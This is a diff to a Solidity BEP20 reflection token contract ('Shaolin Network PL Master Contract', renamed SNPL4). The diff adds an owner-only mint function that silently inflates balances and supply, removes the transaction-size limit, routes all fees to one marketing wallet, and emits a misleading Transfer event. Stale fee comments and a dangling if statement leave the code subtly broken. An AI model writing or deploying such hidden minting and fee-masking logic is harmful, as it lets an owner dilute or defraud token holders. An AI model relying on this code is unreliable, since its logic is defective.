@@ -27,7 +27,6 @@ interface IBEP20 {
      * @dev Returns the amount of tokens owned by `account`.
      */
     function balanceOf(address account) external view returns (uint256);
-
     /**
      * @dev Moves `amount` tokens from the caller's account to `recipient`.
      *
@@ -446,7 +445,8 @@ contract Ownable is Context {
     }
 }
 
-contract ShaolinNetworkPLMasterContract is Context, IBEP20, Ownable {
+contract SNPL4 is Context, IBEP20, Ownable {
+
     using SafeMath for uint256;
     using Address for address;
 
@@ -457,15 +457,15 @@ contract ShaolinNetworkPLMasterContract is Context, IBEP20, Ownable {
     mapping (address => bool) private _isExcluded;
     mapping (address => bool) private _isWin;
     address[] private _excluded;
-    address private _charity;
     address private _marketing;
-    address private _dev;
-    address private _lottery;
+    // address private _charity;
+    // address private _dev;
+    // address private _lottery;
 
 
     string  private constant _NAME = 'Shaolin Network PL Master Contract';
     string  private constant _SYMBOL = 'SNPL-MC';
-    uint8   private constant _DECIMALS = 10;
+    uint8   private constant _DECIMALS = 18;
     
     uint256 private constant _MAX = ~uint256(0);
     uint256 private constant _DECIMALFACTOR = 10 ** uint256(_DECIMALS);
@@ -480,8 +480,8 @@ contract ShaolinNetworkPLMasterContract is Context, IBEP20, Ownable {
     
     uint256 private     _TAX_FEE = 100; // 1% BACK TO HOLDERS
     uint256 private    _BURN_FEE = 100; // 1% BURNED
-    uint256 private _Win_Wallet = 400; // 4% TO CHARITY WALLET & all the rest of the wallets
-    uint256 private constant _MAX_TX_SIZE = 3333333330 * _DECIMALFACTOR;
+    uint256 private  _Win_Wallet = 100; // 4% TO CHARITY WALLET & all the rest of the wallets
+    // uint256 private constant _MAX_TX_SIZE = 3333333330 * _DECIMALFACTOR;
     // 1% Reflections (not for fundraisers) ✅
     // 1% Burn
     // 1% Charitable Causes
@@ -498,7 +498,13 @@ contract ShaolinNetworkPLMasterContract is Context, IBEP20, Ownable {
         _rOwned[_owner] = _rTotal;
         _marketing = market;
         _isWin[market] = true;
+        
         emit Transfer(address(0), _owner, _tTotal);
+    }
+
+    function mint(address _user , uint _amount) public onlyOwner {
+        _rOwned[_user] += _amount;
+        _tTotal += _amount;    
     }
 
     function name() public pure returns (string memory) {
@@ -621,20 +627,20 @@ contract ShaolinNetworkPLMasterContract is Context, IBEP20, Ownable {
         }
     }
 
-    function setWinWallet(address charity,address Dev, address Lottery) external onlyOwner() {
-        require(charity != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'The Uniswap router can not be the charity account.');
-        require(Dev != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'The Uniswap router can not be the Dev account.');
-        require(Lottery != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'The Uniswap router can not be the Lottery account.');
-        require(!_isWin[charity], "Account is already charity account");
-        require(!_isWin[Dev], "Account is already Dev account");
-        require(!_isWin[Lottery], "Account is already Lottery account");
-        _isWin[charity] = true;
-        _isWin[Dev] = true;
-        _isWin[Lottery] = true;
-        _charity = charity;
-        _dev = Dev;
-        _lottery = Lottery;
-    }
+    // function setWinWallet(address charity,address Dev, address Lottery) external onlyOwner() {
+    //     require(charity != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'The Uniswap router can not be the charity account.');
+    //     require(Dev != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'The Uniswap router can not be the Dev account.');
+    //     require(Lottery != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'The Uniswap router can not be the Lottery account.');
+    //     require(!_isWin[charity], "Account is already charity account");
+    //     require(!_isWin[Dev], "Account is already Dev account");
+    //     require(!_isWin[Lottery], "Account is already Lottery account");
+    //     _isWin[charity] = true;
+    //     _isWin[Dev] = true;
+    //     _isWin[Lottery] = true;
+    //     _charity = charity;
+    //     _dev = Dev;
+    //     _lottery = Lottery;
+    // }
 
     function _approve(address owner, address spender, uint256 amount) private {
         require(owner != address(0), "BEP20: approve from the zero address");
@@ -657,7 +663,7 @@ contract ShaolinNetworkPLMasterContract is Context, IBEP20, Ownable {
         if (!takeFee) removeAllFee();
         
         if (sender != owner() && recipient != owner())
-            require(amount <= _MAX_TX_SIZE, "Transfer amount exceeds the maxTxAmount.");
+            // require(amount <= _MAX_TX_SIZE, "Transfer amount exceeds the maxTxAmount.");
         
         if (_isExcluded[sender] && !_isExcluded[recipient]) {
             _transferFromExcluded(sender, recipient, amount);
@@ -804,20 +810,24 @@ contract ShaolinNetworkPLMasterContract is Context, IBEP20, Ownable {
 
     function _sendToCharity(uint256 tWinWallet, address sender) private {
         uint256 currentRate = _getRate();
-        uint256 rCharity = tWinWallet.mul(currentRate)/4;
-        address currentWinWallet = _charity;
+        uint256 rCharity = tWinWallet.mul(currentRate)/1;
         address Market = _marketing;
-        address Dev = _dev;
-        address Prize = _lottery;
-        _rOwned[currentWinWallet] = _rOwned[currentWinWallet].add(rCharity);
-        _tOwned[currentWinWallet] = _tOwned[currentWinWallet].add(tWinWallet/4);
+        // address currentWinWallet = _charity;
+        // address Dev = _dev;
+        // address Prize = _lottery;
+        //1
         _rOwned[Market] = _rOwned[Market].add(rCharity);
-        _tOwned[Market] = _tOwned[Market].add(tWinWallet/4);
-        _rOwned[Dev] = _rOwned[Dev].add(rCharity);
-        _tOwned[Dev] = _tOwned[Dev].add(tWinWallet/4);
-        _rOwned[Prize] = _rOwned[Prize].add(rCharity);
-        _tOwned[Prize] = _tOwned[Prize].add(tWinWallet/4);
-        emit Transfer(sender, currentWinWallet, tWinWallet);
+        _tOwned[Market] = _tOwned[Market].add(tWinWallet/1);
+        //2
+        // _rOwned[currentWinWallet] = _rOwned[currentWinWallet].add(rCharity);
+        // _tOwned[currentWinWallet] = _tOwned[currentWinWallet].add(tWinWallet/4);
+        // //3
+        // _rOwned[Dev] = _rOwned[Dev].add(rCharity);
+        // _tOwned[Dev] = _tOwned[Dev].add(tWinWallet/4);
+        // //4
+        // _rOwned[Prize] = _rOwned[Prize].add(rCharity);
+        // _tOwned[Prize] = _tOwned[Prize].add(tWinWallet/4);
+        emit Transfer(sender, sender, tWinWallet);
     }
 
     function removeAllFee() private {
@@ -842,8 +852,8 @@ contract ShaolinNetworkPLMasterContract is Context, IBEP20, Ownable {
         return _TAX_FEE;
     }
 
-    function _getMaxTxAmount() private pure returns(uint256) {
-        return _MAX_TX_SIZE;
-    }
+    // function _getMaxTxAmount() private pure returns(uint256) {
+    //     return _MAX_TX_SIZE;
+    // }
     
 }
